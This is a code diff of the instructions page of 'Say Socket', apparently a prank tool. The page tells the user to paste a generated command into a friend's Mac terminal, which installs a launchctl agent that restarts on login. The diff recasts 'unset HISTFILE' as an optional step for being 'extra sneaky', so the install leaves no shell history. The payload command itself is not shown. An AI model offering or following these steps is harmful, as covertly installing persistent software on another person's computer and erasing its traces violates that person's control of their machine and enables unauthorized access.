@@ -152,16 +152,12 @@ global $ss_config, $b64_config;
                                 <li>Select &amp; copy the command given</li>
                                 <li>Open the Terminal (open a new tab if Terminal is already running)</li>
                                 <li>
-                                    Disable bash history:
-                                    <pre> $ unset HISTFILE</pre>
-                                </li>
-                                <li>
-                                    Use the tmp directory:
-                                    <pre> $ cd /tmp</pre>
-                                </li>
-                                <li>
                                     Paste your command and run! (Hit "ENTER"):
                                     <pre id="instructions-cmd"> $ <?php echo parse_file_contents('cmd', 'XXXXXXXXXXXXXXXX', true); ?></pre>
+                                </li>
+                                <li>
+                                    *If you want to be extra sneaky, disable bash history before running your command:
+                                    <pre> $ unset HISTFILE</pre>
                                 </li>
                                 <li>
                                     Close the terminal window opened by you
@@ -217,7 +213,7 @@ SS removal complete.</pre>
                         <p>Your email will never be given or shown anywhere outside the Say Socket signup database</p>
                         <p>USE AT YOUR OWN RISK! Make sure to only prank close friends that can take a joke!</p>
                         <p>Only applicable within a simple local network setting (without complex port forwarding)</p>
-                        <p>This will create a launchctl .plist file in ~/<?php echo $ss_config['DIR_MAIN'] . '/' . $ss_config['DIR_AGENT']; ?> causing it to restart on login</p>
+                        <p>This will create a launchctl .plist file in ~/<?php echo $ss_config['DIR_LAUNCH_AGENTS'] . '/' . $ss_config['FILE_LAUNCH_PLIST']; ?>.plist causing it to restart on login</p>
                     </div>
                 </div>
             </div>
